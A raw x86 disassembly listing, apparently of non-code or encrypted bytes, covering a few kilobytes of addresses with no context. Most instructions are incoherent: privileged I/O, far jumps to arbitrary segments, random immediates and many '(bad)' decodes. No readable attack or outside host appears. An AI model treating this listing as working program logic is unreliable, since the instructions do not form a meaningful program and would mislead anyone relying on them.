  411fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fb9:	rol    DWORD PTR [ecx+0x40],cl
  411fbc:	and    al,0xc0
  411fbe:	scas   al,BYTE PTR es:[edi]
  411fbf:	add    BYTE PTR [ebp+ebx*4-0x24],ch
  411fc3:	scas   eax,DWORD PTR es:[edi]
  411fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc5:	cmp    DWORD PTR [eax+edi*2-0x5184c3ba],edi
  411fcc:	retf   
  411fcd:	icebp  
  411fce:	gs test eax,0x41f3a5e9
  411fd4:	sbb    eax,0xf694112d
  411fd9:	push   edx
  411fda:	enter  0x49a2,0xf2
  411fde:	pop    ss
  411fdf:	xchg   ebx,edx
  411fe1:	daa    
  411fe2:	and    eax,0x76666e5d
  411fe7:	mov    cs,ebp
  411fe9:	rol    BYTE PTR [eax+0x1e],cl
  411fec:	fwait
  411fed:	ret    
  411fee:	es out 0xa7,eax
  411ff1:	inc    esp
  411ff2:	jmp    0x3cb9d348
  411ff7:	adc    ecx,DWORD PTR [edx]
  411ff9:	pop    es
  411ffa:	daa    
  411ffb:	or     BYTE PTR [ebx+0x7bbd992f],0xa1
  412002:	mov    esp,DWORD PTR [ecx+0x61]
  412005:	mov    BYTE PTR [esi-0x1308fb56],ch
  41200b:	pop    edx
  41200c:	popa   
  41200d:	lea    ecx,[edi-0x5d1c01dc]
  412013:	and    eax,0x9952dc79
  412018:	inc    ebp
  412019:	add    eax,0x45ddce45
  41201e:	aaa    
  41201f:	les    ebp,FWORD PTR [edx]
  412021:	lahf   
  412022:	fcom   st(7)
  412024:	and    al,0xbf
  412026:	lds    eax,FWORD PTR [edi+edx*2]
  412029:	pop    eax
  41202a:	not    edx
  41202c:	lods   eax,DWORD PTR ds:[esi]
  41202d:	imul   esi,DWORD PTR [eax-0x5d],0x6a
  412031:	cmc    
  412032:	mov    cl,0x77
  412034:	jecxz  0x41203f
  412036:	ins    BYTE PTR es:[edi],dx
  412037:	jmp    0xc1a8:0xc8276b70
  41203e:	adc    BYTE PTR [edi+0x13],ah
  412041:	jg     0x411ff9
  412043:	cmp    BYTE PTR ds:0x543a8f9c,bh
  412049:	gs (bad) 
  41204b:	retf   0xf009
  41204e:	inc    eax
  41204f:	sbb    ebx,DWORD PTR [edx+0x67]
  412052:	ins    DWORD PTR es:[edi],dx
  412053:	jno    0x411ff1
  412055:	and    BYTE PTR [edx-0x5e2c5684],ch
  41205b:	or     ebp,esi
  41205d:	xor    al,dh
  41205f:	js     0x412010
  412061:	inc    ecx
  412062:	das    
  412063:	push   edx
  412064:	sub    DWORD PTR [ebx+0x12],ecx
  412067:	adc    bl,BYTE PTR [edi]
  412069:	lods   eax,DWORD PTR ds:[esi]
  41206a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41206b:	call   0xcf7f:0xc3526bf8
  412072:	mov    BYTE PTR [ebp+edi*2+0x75],al
  412076:	scas   al,BYTE PTR es:[edi]
  412077:	fs out dx,eax
  412079:	fld    TBYTE PTR [edi]
  41207b:	dec    ebp
  41207c:	seta   BYTE PTR [esp+edi*2+0x1ae0a7de]
  412084:	mov    WORD PTR fs:[edx+0x34],gs
  412088:	ficomp DWORD PTR [eax+0x679496a3]
  41208e:	adc    al,ch
  412090:	addr16 jae 0x41205d
  412093:	ror    BYTE PTR [ecx],cl
  412095:	push   ds
  412096:	pop    es
  412097:	add    al,0x84
  412099:	xor    eax,0xffffffba
  41209c:	xchg   ecx,eax
  41209d:	fs addr16 call 0x302ff250
  4120a4:	clc    
  4120a5:	push   ebp
  4120a6:	adc    al,0xcc
  4120a8:	mov    edx,0x392901f
  4120ad:	pop    edi
  4120ae:	in     al,dx
  4120af:	push   ebx
  4120b0:	and    DWORD PTR [edi+0x60],ecx
  4120b3:	mov    ecx,0x9d1de8b5
  4120b8:	jb     0x412103
  4120ba:	xor    al,0xcd
  4120bc:	pop    ebx
  4120bd:	outs   dx,DWORD PTR ds:[esi]
  4120be:	mov    bh,0xca
  4120c0:	cwde   
  4120c1:	pop    edx
  4120c2:	in     al,0x3c
  4120c4:	pop    edi
  4120c5:	ins    DWORD PTR es:[edi],dx
  4120c6:	xchg   ecx,eax
  4120c7:	lods   al,BYTE PTR ds:[esi]
  4120c8:	or     DWORD PTR [edx-0x113bff77],edx
  4120ce:	xchg   esp,eax
  4120cf:	ins    BYTE PTR es:[edi],dx
  4120d0:	or     al,0x26
  4120d2:	fidiv  WORD PTR [ebp-0x43]
  4120d5:	mov    ebp,0xc172a092
  4120da:	pushf  
  4120db:	leave  
  4120dc:	addr16 std 
  4120de:	retf   
  4120df:	aam    0xd5
  4120e1:	xchg   esi,eax
  4120e2:	cmp    edx,DWORD PTR [eax+ebx*4-0x2ff128d0]
  4120e9:	cmp    BYTE PTR ds:[ecx+0x6e],bh
  4120ed:	cmp    dl,BYTE PTR [esi]
  4120ef:	ja     0x412157
  4120f1:	or     eax,0xd40d94ae
  4120f6:	and    eax,0x3210aac9
  4120fb:	cmp    al,0xd6
  4120fd:	fistp  DWORD PTR [eax-0x61]
  412100:	inc    esi
  412101:	stc    
  412102:	loope  0x4120ed
  412104:	mov    dl,0xf8
  412106:	dec    ebx
  412107:	push   esp
  412108:	xor    DWORD PTR [eax+0xe],esp
  41210b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41210c:	sahf   
  41210d:	cmc    
  41210e:	dec    ebp
  41210f:	cmp    DWORD PTR [ebx],edi
  412111:	fisttp QWORD PTR [ecx-0x2380fbda]
  412117:	pop    esp
  412118:	mov    al,ds:0x1a979991
  41211d:	mov    ebx,0x4a8d68d8
  412122:	aad    0x62
  412124:	mov    ecx,0x47709df0
  412129:	int3   
  41212a:	cmp    cl,BYTE PTR [esp+eax*2]
  41212d:	imul   esp,DWORD PTR [esi+0x21],0x4b77007a
  412134:	fistp  WORD PTR [ecx+0x1bf5662c]
  41213a:	mov    edi,0x36857c45
  41213f:	add    eax,esp
  412141:	je     0x41216f
  412143:	mov    al,0x8
  412145:	mov    esp,0x851cd210
  41214a:	stos   DWORD PTR es:[edi],eax
  41214b:	mov    esp,0xe95b8a32
  412150:	fs std 
  412152:	jbe    0x41212c
  412154:	fdivr  st(6),st
  412156:	pop    edi
  412157:	pop    esp
  412158:	xchg   ebx,eax
  412159:	pop    esi
  41215a:	and    BYTE PTR [eax],al
  41215c:	arpl   si,si
  41215e:	add    ah,BYTE PTR [ebx]
  412160:	xor    DWORD PTR [edi-0x7d051a47],edi
  412166:	add    esp,ebx
  412168:	mov    bh,0x16
  41216a:	xor    bh,al
  41216c:	add    eax,0xf2b8bfc9
  412171:	pop    ecx
  412172:	das    
  412173:	push   ss
  412174:	jo     0x4121b5
  412176:	mov    ecx,0x732e8020
  41217b:	xor    DWORD PTR [edi+0x79f0cbd3],eax
  412181:	pop    es
  412182:	xchg   ecx,edx
  412184:	push   0xfb569ab7
  412189:	pop    es
  41218a:	mov    dl,BYTE PTR [edx-0x4276503f]
  412190:	or     bh,cl
  412192:	jmp    0x4121e0
  412194:	push   eax
  412195:	lds    ebp,FWORD PTR ds:0x1d9caefc
  41219b:	mov    WORD PTR [esi+0x4b],ds
  41219e:	add    edx,DWORD PTR [eax+0x6f]
  4121a1:	out    0x3f,eax
  4121a3:	add    eax,0xcd2399cf
  4121a8:	fidiv  DWORD PTR [ebp-0xc]
  4121ab:	int    0xf7
  4121ad:	in     eax,0x32
  4121af:	cld    
  4121b0:	pop    ecx
  4121b1:	or     DWORD PTR [ecx+0x29],edx
  4121b4:	pop    edx
  4121b5:	in     eax,0x8b
  4121b7:	lods   al,BYTE PTR ds:[esi]
  4121b8:	ja     0x4121e9
  4121ba:	inc    edx
  4121bb:	not    esi
  4121bd:	scas   eax,DWORD PTR es:[edi]
  4121be:	imul   ebx,DWORD PTR [esi+eax*4-0x73],0xfffffff6
  4121c3:	pop    esp
  4121c4:	and    eax,0x389ddd5b
  4121c9:	scas   eax,DWORD PTR es:[edi]
  4121ca:	ins    DWORD PTR es:[edi],dx
  4121cb:	js     0x4121e7
  4121cd:	dec    ebp
  4121ce:	and    al,0x1a
  4121d0:	dec    ebx
  4121d1:	push   ss
  4121d2:	leave  
  4121d3:	stos   BYTE PTR es:[edi],al
  4121d4:	mov    edi,0x48575c4c
  4121d9:	mul    BYTE PTR [edi-0x56]
  4121dc:	imul   ecx,DWORD PTR [edx-0x4],0x6e
  4121e0:	sub    bh,BYTE PTR [edx+0xe]
  4121e3:	sar    BYTE PTR [esi-0x74],0x6
  4121e7:	call   DWORD PTR [edi]
  4121e9:	adc    ebx,DWORD PTR [ebx-0x15cc4a43]
  4121ef:	and    al,0x1
  4121f1:	repz jecxz 0x4121bf
  4121f4:	mov    ecx,0x856d62ec
  4121f9:	mov    bl,dl
  4121fb:	mov    ?,ebx
  4121fd:	inc    eax
  4121fe:	or     BYTE PTR ds:0x81b2aa53,dh
  412204:	mov    WORD PTR [eax-0x214aa845],ds
  41220a:	bound  eax,QWORD PTR [ebx]
  41220c:	inc    esi
  41220d:	sbb    BYTE PTR cs:[edx+ebx*8+0x65b6d4b3],0x9f
  412216:	(bad)  
  412218:	(bad)  
  412219:	mov    ecx,0x9489104
  41221e:	stc    
  41221f:	cmp    DWORD PTR ds:0x789be1ac,ecx
  412225:	push   ecx
  412226:	adc    esp,ebx
  412228:	xor    DWORD PTR [ebp+0x78],esi
  41222b:	jecxz  0x41223a
  41222d:	inc    edx
  41222e:	push   esi
  41222f:	sbb    eax,0x7578dd9f
  412234:	nop
  412235:	xlat   BYTE PTR ds:[ebx]
  412236:	shr    DWORD PTR [edx],0x42
  412239:	test   BYTE PTR [ecx-0x30],ah
  41223c:	in     eax,0x2c
  41223e:	scas   eax,DWORD PTR es:[edi]
  41223f:	iret   
  412240:	enter  0xda8b,0x6a
  412244:	ret    0xaf5f
  412247:	push   ecx
  412248:	idiv   DWORD PTR [ebp+esi*4+0x67]
  41224c:	stc    
  41224d:	mov    edi,0xd7dc7bac
  412252:	pop    ebp
  412253:	hlt    
  412254:	or     al,0x48
  412256:	push   0xffffff85
  412258:	mov    esi,0xa0e888e0
  41225d:	pop    es
  41225e:	push   edx
  41225f:	loope  0x412249
  412261:	pusha  
  412262:	mov    ds:0xe3f25a,eax
  412267:	(bad)  
  41226a:	retf   
  41226b:	mov    WORD PTR [edi],ds
  41226d:	jl     0x4121fd
  41226f:	jne    0x412279
  412271:	mov    dl,0x8d
  412273:	inc    edx
  412274:	mov    al,ds:0x779aaefd
  412279:	stc    
  41227a:	xor    ah,BYTE PTR [edx-0x724d753b]
  412280:	add    ch,BYTE PTR [ebx]
  412282:	scas   al,BYTE PTR es:[edi]
  412283:	mov    edi,ebp
  412285:	dec    ecx
  412286:	xchg   ebx,eax
  412287:	or     BYTE PTR [edi+0x4a],dh
  41228a:	xchg   esi,eax
  41228b:	scas   al,BYTE PTR es:[edi]
  41228c:	sub    al,0x2b
  41228e:	adc    BYTE PTR [edx+0x50],ah
  412291:	mov    ah,0x8a
  412293:	lods   al,BYTE PTR ds:[esi]
  412294:	lods   al,BYTE PTR ds:[esi]
  412295:	mov    esi,0xc168499d
  41229a:	fs push 0x40947723
  4122a0:	int3   
  4122a1:	cmp    eax,0x7ec6b321
  4122a6:	mov    ds:0xa7941663,eax
  4122ab:	lds    edi,FWORD PTR [ecx]
  4122ad:	pop    ecx
  4122ae:	and    BYTE PTR [esi-0x28],0x76
  4122b2:	adc    eax,0xb969951a
  4122b7:	lahf   
  4122b8:	std    
  4122b9:	cli    
  4122ba:	fcomp  DWORD PTR [ebp+0x7c]
  4122bd:	sub    dh,al
  4122bf:	call   0xb9f:0x8c06abe8
  4122c6:	fdiv   QWORD PTR ss:[ebp+0x59]
  4122ca:	mov    ebp,0xbb8e303f
  4122cf:	jge    0x412344
  4122d1:	mov    gs,eax
  4122d3:	(bad)
  4122d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122d7:	inc    ebp
  4122d8:	sar    DWORD PTR [esi],cl
  4122da:	push   esi
  4122db:	fbstp  TBYTE PTR [edx-0x951c58d]
  4122e1:	push   0xed1d9ffe
  4122e6:	mov    esi,DWORD PTR [esi+edi*8+0x505d0413]
  4122ed:	xchg   esi,eax
  4122ee:	and    ecx,eax
  4122f0:	fdiv   DWORD PTR [ebp-0x6c211d4c]
  4122f6:	and    BYTE PTR [esi-0x5fdb62fa],0x52
  4122fd:	mov    edx,0x34cbc4b0
  412302:	mov    al,0x14
  412304:	mov    esi,0xe55d401
  412309:	xchg   esi,eax
  41230a:	arpl   WORD PTR [ebp-0x63],bx
  41230d:	xchg   esp,eax
  41230e:	or     ah,BYTE PTR [ebp+0x5176b30a]
  412314:	add    eax,DWORD PTR [ecx-0x1e6e6d33]
  41231a:	retf   
  41231b:	fistp  DWORD PTR [ecx+0x7a1aeb13]
  412321:	fsub   st(1),st
  412323:	xor    dh,bl
  412325:	stc    
  412326:	push   0xffffffd7
  412328:	out    dx,al
  412329:	mov    ebp,0x7cb2a3f1
  41232e:	sti    
  41232f:	cmc    
  412330:	jne    0x412322
  412332:	(bad)  
  412333:	adc    edi,DWORD PTR [edi-0xc]
  412336:	repnz cld 
  412338:	mov    ebx,0x301d6b6b
  41233d:	in     eax,dx
  41233e:	rcl    DWORD PTR [edi+eiz*8],0xf4
  412342:	jbe    0x412307
  412344:	call   0xc0c3:0xb8944a56
  41234b:	mov    ch,0x53
  41234d:	and    al,dl
  41234f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412350:	sub    DWORD PTR [edx-0x39],ecx
  412353:	fcom   DWORD PTR [ebx+0x1022d76a]
  412359:	mov    ah,0x44
  41235b:	aas    
  41235c:	std    
  41235d:	shr    BYTE PTR [ecx+ebx*8],1
  412360:	sbb    BYTE PTR [esi-0x25357588],0x4e
  412367:	arpl   WORD PTR [edx+0x3281fc2b],dx
  41236d:	adc    BYTE PTR [ebx+0x4b],dh
  412370:	jbe    0x412312
  412372:	ss mov edi,0x1b24f415
  412378:	xor    DWORD PTR [ecx+0x1c],ecx
  41237b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41237c:	sbb    al,0xbd
  41237e:	push   es
  41237f:	push   es
  412380:	xlat   BYTE PTR ds:[ebx]
  412381:	push   ebx
  412382:	sub    DWORD PTR [eax-0x30e7171d],0xfffffffb
  412389:	retf   0x1d0a
  41238c:	push   ecx
  41238d:	out    dx,al
  41238e:	sbb    BYTE PTR [ebx+ebx*2-0x6a],ch
  412392:	inc    ebp
  412393:	aaa    
  412394:	inc    edi
  412395:	or     ebx,DWORD PTR [edx]
  412397:	fdiv   QWORD PTR [eax+edx*4+0x36]
  41239b:	bound  edi,QWORD PTR [esi+0x1e]
  41239e:	dec    ebp
  41239f:	popf   
  4123a0:	push   ecx
  4123a1:	adc    edi,DWORD PTR [ecx+0x8]
  4123a4:	outs   dx,DWORD PTR ds:[esi]
  4123a5:	ret    0x1596
  4123a8:	lea    ebp,[ebp-0x2b8e09a]
  4123ae:	retf   
  4123af:	push   ebx
  4123b0:	cld    
  4123b1:	fwait
  4123b2:	pushf  
  4123b3:	int    0x17
  4123b5:	adc    ebx,esi
  4123b7:	in     eax,0x46
  4123b9:	push   es
  4123ba:	pusha  
  4123bb:	adc    eax,DWORD PTR [eax]
  4123bd:	or     ebx,edx
  4123bf:	aam    0x22
  4123c1:	cli    
  4123c2:	pop    eax
  4123c3:	mov    ebp,0x7ae2a1d6
  4123c8:	fcmovnbe st,st(3)
  4123ca:	imul   edx,DWORD PTR [ebx],0xffffffaa
  4123cd:	mov    esi,0xa8784548
  4123d2:	retf   
  4123d3:	fidiv  DWORD PTR [ebx-0x5f]
  4123d6:	mov    ch,0x90
  4123d8:	jnp    0x41240c
  4123da:	push   es
  4123db:	xchg   esp,eax
  4123dc:	mov    DWORD PTR [eax-0x5a028faa],ecx
  4123e2:	not    DWORD PTR [ebx]
  4123e4:	ins    DWORD PTR es:[edi],dx
  4123e5:	adc    al,0xc2
  4123e7:	mov    bl,0x0
  4123e9:	pop    edi
  4123ea:	push   esp
  4123eb:	push   0x19
  4123ed:	sbb    al,0x54
  4123ef:	imul   edi,DWORD PTR [ebx+0x3deebde6],0x7d
  4123f6:	jmp    DWORD PTR [esi-0x7bc51f5d]
  4123fc:	mov    ds:0xc7f6554c,eax
  412401:	dec    eax
  412402:	(bad)  
  412403:	push   ebp
  412404:	and    al,0x6f
  412406:	test   eax,0xac1150b0
  41240b:	dec    edx
  41240c:	pop    ebx
  41240d:	out    dx,al
  41240e:	jne    0x412447
  412410:	retf   0x654b
  412413:	imul   esi,DWORD PTR [ecx-0x621a138b],0x1f
  41241a:	push   0x6f8223df
  41241f:	stc    
  412420:	out    0x71,eax
  412422:	hlt    
  412423:	sar    DWORD PTR [edx],1
  412425:	stc    
  412426:	icebp  
  412427:	adc    BYTE PTR [ecx],bl
  412429:	jnp    0x41248d
  41242b:	pop    ss
  41242c:	mov    ecx,0x91498769
  412431:	std    
  412432:	stos   DWORD PTR es:[edi],eax
  412433:	cmp    al,0x3c
  412435:	push   ebx
  412436:	add    BYTE PTR [edx+ebx*2-0x47231575],bh
  41243d:	fdiv   QWORD PTR ds:0xadd7015e
  412443:	enter  0xec39,0xa
  412447:	das    
  412448:	cwde   
  412449:	cmp    BYTE PTR gs:[ecx+0x1b4c9d17],bl
  412450:	and    bh,BYTE PTR [edi]
  412452:	jns    0x41244c
  412454:	retf   0xfebd
  412457:	lea    esi,[edi+0x6f504b2f]
  41245d:	jae    0x412470
  41245f:	gs push ecx
  412461:	scas   eax,DWORD PTR es:[edi]
  412462:	push   esi
  412463:	sub    eax,edx
  412465:	div    DWORD PTR [eax+0x7f]
  412468:	retf   
  412469:	xchg   edi,eax
  41246a:	xchg   ebp,eax
  41246b:	clc    
  41246c:	bound  ecx,QWORD PTR [edi+0x6a7217cd]
  412472:	push   0xffffff93
  412474:	(bad)  
  412475:	mov    eax,ds:0xc4f443d
  41247a:	adc    BYTE PTR [esi],ah
  41247c:	cli    
  41247d:	cwde   
  41247e:	bound  ecx,QWORD PTR [edi-0x1e]
  412481:	das    
  412482:	pop    esp
  412483:	and    DWORD PTR [edi],eax
  412485:	and    DWORD PTR [ecx+ecx*8-0x30cfeb0],ebx
  41248c:	lds    edi,FWORD PTR ds:0x3b74b382
  412492:	xor    eax,DWORD PTR [ebp+0x5f21200b]
  412498:	pop    ds
  412499:	bound  esp,QWORD PTR [eax-0x12]
  41249c:	andnps xmm4,XMMWORD PTR [ebp-0x3f2babf7]
  4124a3:	jecxz  0x41243d
  4124a5:	mov    ecx,0x537ef511
  4124aa:	in     al,dx
  4124ab:	cld    
  4124ac:	xchg   edi,eax
  4124ad:	mov    BYTE PTR [edi-0xe],bl
  4124b0:	stc    
  4124b1:	fst    QWORD PTR [ebx]
  4124b3:	gs jno 0x4124e9
  4124b6:	in     al,dx
  4124b7:	rol    DWORD PTR [ebx],1
  4124b9:	mov    al,0xe3
  4124bb:	scas   al,BYTE PTR es:[edi]
  4124bc:	add    al,0xed
  4124be:	je     0x41252b
  4124c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124c1:	retf   
  4124c2:	int3   
  4124c3:	out    dx,eax
  4124c4:	or     DWORD PTR [eax+0x65],esi
  4124c7:	mov    ebp,0x3fb5cc42
  4124cc:	shr    DWORD PTR [eax-0xf2b6ac1],0x33
  4124d3:	sar    BYTE PTR [esp+ebp*1],cl
  4124d6:	mov    esi,0xca2a933a
  4124db:	inc    ecx
  4124dc:	adc    al,0x25
  4124de:	pop    ds
  4124df:	xchg   BYTE PTR [eax+0x2],ch
  4124e2:	stos   BYTE PTR es:[edi],al
  4124e3:	mov    dh,0x4d
  4124e5:	xchg   ebx,eax
  4124e6:	dec    ebx
  4124e7:	push   0xffffff84
  4124e9:	mov    edi,0x79a03572
  4124ee:	(bad)  
  4124ef:	inc    ebx
  4124f0:	pop    esp
  4124f1:	pushf  
  4124f2:	jle    0x412556
  4124f4:	adc    eax,0x43dee52e
  4124f9:	and    ebx,DWORD PTR [ecx-0x20]
  4124fc:	adc    al,bl
  4124fe:	mov    ah,0x8f
  412500:	ror    BYTE PTR [edi+0x6b3f6635],0xbf
  412507:	imul   ebx,DWORD PTR [eax],0xfffffffb
  41250a:	shl    BYTE PTR [edx],1
  41250c:	out    0x11,al
  41250e:	imul   ebx,DWORD PTR [ebp-0x68c7e2ec],0xffffff9f
  412515:	adc    DWORD PTR [eax+0xc],ebx
  412518:	push   0x17
  41251a:	(bad)  
  41251b:	ret    
  41251c:	sti    
  41251d:	xchg   edx,eax
  41251e:	sbb    DWORD PTR [eax-0x60],esp
  412521:	jb     0x412580
  412523:	imul   eax,DWORD PTR [ebp+eiz*4+0x60],0x4f
  412528:	xchg   ebx,eax
  412529:	ret    0xcfa5
  41252c:	mov    dl,0x8e
  41252e:	outs   dx,BYTE PTR ds:[esi]
  41252f:	or     eax,0xf95660df
  412534:	xor    edi,ebx
  412536:	out    dx,al
  412537:	in     eax,dx
  412538:	jae    0x4124ef
  41253a:	nop
  41253b:	xor    BYTE PTR [edx+0xe87d2b1],cl
  412541:	fmul   DWORD PTR [eax-0x340175e0]
  412547:	ss das 
  412549:	lds    ebp,FWORD PTR [esi]
  41254b:	ror    BYTE PTR [esi],cl
  41254d:	test   eax,0xca0ae0d8
  412552:	scas   al,BYTE PTR es:[edi]
  412553:	pop    esi
  412554:	out    0x1,eax
  412556:	mov    ebx,0x8f7b6b35
  41255b:	mov    DWORD PTR [eax+edi*8-0x6ed52bda],edx
  412562:	and    ch,BYTE PTR [ebx-0xb34abce]
  412568:	pushf  
  412569:	stos   BYTE PTR es:[edi],al
  41256a:	pop    esi
  41256b:	dec    esi
  41256c:	(bad)  
  41256d:	xchg   edx,eax
  41256e:	xchg   esi,eax
  41256f:	push   edx
  412570:	inc    edx
  412571:	xchg   edx,eax
  412572:	sar    esi,cl
  412574:	adc    eax,0xb664c73a
  412579:	(bad)
  41257c:	or     eax,edx
  41257e:	je     0x4125ce
  412580:	jb     0x412597
  412582:	jmp    0xb434f9ed
  412587:	sbb    al,0x14
  412589:	aad    0x5f
  41258b:	jne    0x412538
  41258d:	fwait
  41258e:	push   es
  41258f:	mov    ch,0x27
  412591:	int3   
  412592:	mov    gs,ecx
  412594:	fild   WORD PTR cs:[ecx]
  412597:	inc    eax
  412598:	sbb    eax,0x2afc3d03
  41259d:	push   ss
  41259e:	mov    edi,0x3f2e134e
  4125a3:	xchg   edx,eax
  4125a4:	mov    esi,0x65835f86
  4125a9:	ja     0x4125c4
  4125ab:	rol    BYTE PTR [edx-0x7b],1
  4125ae:	or     al,0xae
  4125b0:	push   ebp
  4125b1:	sub    ecx,eax
  4125b3:	xchg   esi,eax
  4125b4:	mov    cl,0x86
  4125b6:	loope  0x4125c9
  4125b8:	pop    es
  4125b9:	sub    cl,BYTE PTR [ebp+eiz*4-0xf08b187]
  4125c0:	fild   QWORD PTR [esi+ebp*2+0x508a7070]
  4125c7:	cmc    
  4125c8:	iret   
  4125c9:	pop    es
  4125ca:	mov    ds:0xd22807d1,al
  4125cf:	inc    esp
  4125d0:	into   
  4125d1:	inc    edx
  4125d2:	(bad)  
  4125d3:	jne    0x4125f2
  4125d5:	dec    ebp
  4125d6:	stc    
  4125d7:	mov    eax,0xe2df6569
  4125dc:	mul    DWORD PTR [ebp-0x6a]
  4125df:	in     al,0x62
  4125e1:	push   ecx
  4125e2:	(bad)  [bx+di-0x3448]
  4125e7:	dec    esi
  4125e8:	jbe    0x412604
  4125ea:	rol    edx,cl
  4125ec:	sub    edx,DWORD PTR [edx+0x21]
  4125ef:	call   0x99574252
  4125f4:	adc    eax,0x6aed0f29
  4125f9:	pop    ebx
  4125fa:	es ret 0xca2d
  4125fe:	out    0xe4,eax
  412600:	icebp  
  412601:	sbb    esi,DWORD PTR [ebx]
  412603:	ins    DWORD PTR es:[edi],dx
  412604:	stos   DWORD PTR es:[edi],eax
  412605:	push   esp
  412606:	jmp    0x7c69:0x874b027a
  41260d:	inc    esi
  41260e:	or     eax,0x316539cd
  412613:	jns    0x412611
  412615:	pusha  
  412616:	mov    bl,0x71
  412618:	je     0x412657
  41261a:	jmp    0x5168:0x35f8eefe
  412621:	aas    
  412622:	div    BYTE PTR [ecx]
  412624:	int3   
  412625:	mov    dh,0xbc
  412627:	aaa    
  412628:	xchg   edx,eax
  412629:	xchg   DWORD PTR [edx+0x76],ebp
  41262c:	(bad)  
  41262d:	jae    0x412653
  41262f:	or     esi,DWORD PTR [ebx-0x29]
  412632:	popa   
  412633:	ja     0x4125c8
  412635:	cmc    
  412636:	cmp    al,BYTE PTR [ebp+0xb]
  412639:	lds    ebx,FWORD PTR [ebp+0x53eb65ff]
  41263f:	nop
  412640:	dec    edx
  412641:	leave  
  412642:	sub    eax,0x74b426e6
  412647:	scas   eax,DWORD PTR es:[edi]
  412648:	std    
  412649:	push   ebp
  41264a:	lods   al,BYTE PTR ds:[esi]
  41264b:	adc    ah,bh
  41264d:	add    ecx,DWORD PTR [esi-0x6a]
  412650:	xlat   BYTE PTR ds:[ebx]
  412651:	ror    ebp,0x17
  412654:	push   0xe
  412656:	repz in eax,dx
  412658:	adc    eax,0x975abb95
  41265d:	cwde   
  41265e:	dec    edx
  41265f:	mov    gs,WORD PTR [edi+0x1]
  412662:	sub    ecx,DWORD PTR [edx-0x1e6cd613]
  412668:	mov    al,0xd4
  41266a:	xchg   ecx,eax
  41266b:	push   ecx
  41266c:	ret    
  41266d:	jg     0x4126df
  41266f:	push   edi
  412670:	mov    edx,DWORD PTR [ecx+0x724e6b41]
  412676:	jg     0x4126d5
  412678:	jecxz  0x412692
  41267a:	(bad)  
  41267b:	fneni(8087 only) 
  41267d:	add    al,al
  41267f:	sub    al,0x32
  412681:	(bad)  
  412682:	pop    esi
  412683:	mov    edx,0x7a3879a8
  412688:	shr    BYTE PTR [edx],cl
  41268a:	arpl   WORD PTR fs:[esi+0x7e],di
  41268e:	mov    bh,0x21
  412690:	pop    es
  412691:	adc    BYTE PTR [ebp-0x4f214ebc],bl
  412697:	sbb    ecx,edx
  412699:	adc    al,0x32
  41269b:	adc    eax,0x928c2328
  4126a0:	mov    dl,0x23
  4126a2:	sbb    esi,DWORD PTR [edx+0x2c2f41a8]
  4126a8:	sbb    al,0x32
  4126aa:	std    
  4126ab:	inc    eax
  4126ac:	xor    eax,0xbbb652e2
  4126b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126b2:	push   esi
  4126b3:	stos   DWORD PTR es:[edi],eax
  4126b4:	or     DWORD PTR [ebp+0xc7cf002],ebp
  4126ba:	int    0x87
  4126bc:	push   eax
  4126bd:	aas    
  4126be:	(bad)  [edx]
  4126c0:	scas   eax,DWORD PTR es:[edi]
  4126c1:	adc    eax,0xebff5dab
  4126c6:	pop    esp
  4126c7:	aas    
  4126c8:	repz ret 
  4126ca:	push   esi
  4126cb:	and    cl,bh
  4126cd:	dec    ebp
  4126ce:	xchg   BYTE PTR [edx+0x6c],cl
  4126d1:	jg     0x412736
  4126d3:	repnz mov WORD PTR [ebx-0xa1d6815],?
  4126da:	(bad)  
  4126db:	repnz ds pop ds
  4126de:	cmp    BYTE PTR [edi+ebp*2],bl
  4126e1:	mov    al,ds:0xd72d4263
  4126e6:	fidivr WORD PTR [eax+ecx*8-0x67]
  4126ea:	fmul   QWORD PTR [esi-0x29bfb343]
  4126f0:	mov    eax,0xbd924ebe
  4126f5:	add    ecx,DWORD PTR [esi]
  4126f7:	(bad)  
  4126f8:	imul   edi,DWORD PTR ds:0x4d4e25b3,0xa20311a4
  412702:	mov    bl,0xbb
  412704:	mov    edx,0x10c1ec00
  412709:	and    BYTE PTR [ebx],0x61
  41270c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41270d:	scas   al,BYTE PTR es:[edi]
  41270e:	mov    esp,0x86202232
  412713:	nop
  412714:	icebp  
  412715:	fwait
  412716:	ss inc esi
  412718:	(bad)  
  412719:	xchg   edx,eax
  41271a:	vunpcklps ymm6,ymm7,YMMWORD PTR [ebp-0x64fd9073]
  412722:	push   edi
  412723:	add    BYTE PTR [esi],bl
  412725:	sti    
  412726:	adc    DWORD PTR [ecx+eiz*1],esi
  412729:	ffreep st(2)
  41272b:	inc    ecx
  41272c:	test   al,0x71
  41272e:	jp     0x412798
  412730:	dec    esi
  412731:	dec    ebx
  412732:	dec    ebx
  412733:	sub    BYTE PTR [ebp-0x46a6ddc9],dl
  412739:	outs   dx,DWORD PTR ds:[esi]
  41273a:	call   0xa50:0xe7cc7c6c
  412741:	nop
  412742:	pop    es
  412743:	push   ebx
  412744:	pop    ecx
  412745:	jl     0x41273d
  412747:	or     DWORD PTR [esi+eiz*1+0x7ad04973],ebx
  41274e:	cli    
  41274f:	xchg   DWORD PTR ds:0x68fb9dac,eax
  412755:	jo     0x41273a
  412757:	scas   al,BYTE PTR es:[edi]
  412758:	sub    ch,dh
  41275a:	pop    ebp
  41275b:	(bad)  
  41275c:	into   
  41275d:	js     0x41276a
  41275f:	aas    
  412760:	mov    ss,WORD PTR [ebp+0x6a]
  412763:	jg     0x412737
  412765:	xchg   ebp,eax
  412766:	mov    cl,0x38
  412768:	inc    esp
  412769:	fdiv   st(3),st
  41276b:	adc    eax,0x14fa6b42
  412770:	mov    edi,0x22e0e29d
  412775:	or     eax,0xfb890c5f
  41277a:	outs   dx,BYTE PTR ds:[esi]
  41277b:	hlt    
  41277c:	xor    BYTE PTR [edi-0x1f79489a],al
  412782:	iret   
  412783:	adc    cl,ch
  412785:	scas   eax,DWORD PTR es:[edi]
  412786:	mov    ecx,0x298b798a
